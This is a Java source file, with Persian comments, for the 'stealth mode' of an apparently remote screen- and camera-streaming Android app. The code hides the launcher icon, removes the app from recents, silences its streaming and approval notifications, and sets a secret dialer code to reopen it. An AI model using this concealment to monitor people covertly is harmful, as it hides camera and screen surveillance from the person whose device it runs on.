package com.adriarai.payambin;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;

/**
 * حالت مخفی: مخفی کردن آیکن لانچر، حذف از برنامه‌های اخیر، و بی‌صدا کردن
 * اعلان‌ها (بدون آیکن در نوار وضعیت).
 *
 * حدهای اندروید که این کد دور نمی‌زند: اعلان سرویس پیش‌زمینه تا وقتی سرور،
 * دوربین یا صفحه فعال است کاملاً حذف نمی‌شود (بدون آن اندروید سرویس را
 * می‌کشد)؛ برنامه در «برنامه‌های فعال» تنظیمات سریع و نقطه‌ی سبز
 * دوربین/میکروفون هم همچنان دیده می‌شوند.
 */
public class Stealth {
    /** کد مخفی شماره‌گیر: *#*#7777#*#* */
    public static final String CODE = "7777";

    // ---------------- آیکن لانچر ----------------

    public static void setIconHidden(Context c, boolean hidden) {
        try {
            ComponentName alias = new ComponentName(c.getPackageName(), "com.adriarai.payambin.LauncherAlias");
            c.getPackageManager().setComponentEnabledSetting(alias,
                    hidden ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                            : PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {
        }
    }

    public static boolean isIconHidden(Context c) {
        try {
            ComponentName alias = new ComponentName(c.getPackageName(), "com.adriarai.payambin.LauncherAlias");
            return c.getPackageManager().getComponentEnabledSetting(alias)
                    == PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
        } catch (Exception ignored) {
            return false;
        }
    }

    // ---------------- برنامه‌های اخیر ----------------

    /** تسک برنامه را از صفحه‌ی برنامه‌های اخیر حذف کن (وقتی گزینه روشن است) */
    public static void applyRecents(Activity a) {
        if (Build.VERSION.SDK_INT < 21 || !Prefs.stealthRecents(a)) return;
        try {
            ActivityManager am = (ActivityManager) a.getSystemService(Context.ACTIVITY_SERVICE);
            if (am != null) for (ActivityManager.AppTask t : am.getAppTasks()) t.setExcludeFromRecents(true);
        } catch (Exception ignored) {
        }
    }

    // ---------------- اعلان‌ها ----------------

    public static boolean silent(Context c) {
        return Prefs.stealthSilent(c);
    }

    /** کانال سرویس پیش‌زمینه: در حالت بی‌صدا نسخه‌ی _min با IMPORTANCE_MIN (بدون آیکن در نوار وضعیت) */
    public static String fgsChannel(Context c, String base) {
        return silent(c) ? base + "_min" : base;
    }

    public static int fgsImportance(Context c) {
        return silent(c) ? NotificationManager.IMPORTANCE_MIN : NotificationManager.IMPORTANCE_LOW;
    }

    /** کانال درخواست تأیید: در حالت بی‌صدا LOW به‌جای HIGH */
    public static String askChannel(Context c, String base) {
        return silent(c) ? base + "_min" : base;
    }

    public static int askImportance(Context c) {
        return silent(c) ? NotificationManager.IMPORTANCE_LOW : NotificationManager.IMPORTANCE_HIGH;
    }

    /** همه‌ی کانال‌های برنامه را با وضعیت فعلی بساز (ساختن کانال موجود بی‌اثر است) */
    public static void ensureChannels(Context c) {
        if (Build.VERSION.SDK_INT < 26) return;
        try {
            NotificationManager nm = (NotificationManager) c.getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) return;
            boolean s = silent(c);
            String quiet = s ? " (بی‌صدا)" : "";
            mk(nm, fgsChannel(c, "server"), "سرور پیام‌بین" + quiet, fgsImportance(c));
            mk(nm, fgsChannel(c, "screen"), "اشتراک صفحه" + quiet, fgsImportance(c));
            mk(nm, fgsChannel(c, "camera"), "پخش دوربین" + quiet, fgsImportance(c));
            mk(nm, askChannel(c, "screen_ask"), "درخواست دیدن صفحه" + quiet, askImportance(c));
            mk(nm, askChannel(c, "camera_ask"), "درخواست دوربین" + quiet, askImportance(c));
        } catch (Exception ignored) {
        }
    }

    private static void mk(NotificationManager nm, String id, String name, int imp) {
        NotificationChannel ch = new NotificationChannel(id, name, imp);
        ch.setShowBadge(false);
        nm.createNotificationChannel(ch);
    }

    /** بی‌صدا کردن را اعمال کن: کانال‌های جدید را بساز، اعلان سرویس‌های فعال را دوباره بفرست، کانال‌های استفاده‌نشده را حذف کن */
    public static void applySilent(Context c) {
        ensureChannels(c);
        ServerService.repost();
        ScreenService.repost();
        CameraService.repost();
        if (Build.VERSION.SDK_INT < 26) return;
        try {
            NotificationManager nm = (NotificationManager) c.getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) return;
            boolean s = silent(c);
            for (String base : new String[]{"server", "screen", "camera", "screen_ask", "camera_ask"}) {
                nm.deleteNotificationChannel(s ? base : base + "_min");
            }
        } catch (Exception ignored) {
        }
    }
}
